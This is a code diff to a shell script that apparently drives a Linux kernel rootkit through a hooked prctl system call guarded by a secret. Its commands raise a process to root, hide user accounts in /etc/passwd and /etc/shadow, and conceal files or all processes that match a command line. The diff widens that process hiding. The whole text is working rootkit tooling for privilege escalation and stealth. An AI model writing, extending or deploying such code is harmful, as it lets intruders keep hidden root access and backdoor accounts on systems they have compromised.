@@ -23,10 +23,10 @@
 #   module command to execute
 #     drop PID -> set a process's EUID to its UID
 #     elevate PID -> set a process's EUID to root
-#     fugitive UID -> remove a user from "/etc/passwd" and "/etc/shadow"
-#     hide PATH -> hide an entity ("/proc" paths are treated as processes)
-#     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
-#     unfugitive UID -> replace a user in "/etc/passwd" and "/etc/shadow"
+#     fugitive ETC_PASSWD_LINE -> hide a line from "/etc/passwd" (and its corresponding "/etc/shadow" entry)
+#     hide PATH_OR_COMMAND_LINE -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
+#     show PATH_OR_COMMAND_LINE -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
+#     unfugitive ETC_PASSWD_LINE -> show a line in "/etc/passwd" (and its corresponding "/etc/shadow" entry)
 CALL=157 # `sys_prctl`
 [ -z "$1" ] && echo "Expected a command." >&2 && exit 1
 COMMAND="$1"
@@ -42,11 +42,11 @@ if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
 then
   for _PATH in ${REST}
   do
-    if [ `echo -n "${_PATH}" | cut -c-6` = "/proc/" ]
+    if [ ! -e "${_PATH}" ]
     then
-      # it's likely a process; delegate
+      # if it's not a path, then it's probably a command line
 
-      ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" "@${_PATH}" #`echo -n \"${_PATH}\" | cut -c6-`"
+      ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" "@${_PATH}"
     elif [ "${COMMAND}" = hide ]
     then
       # hide via rename
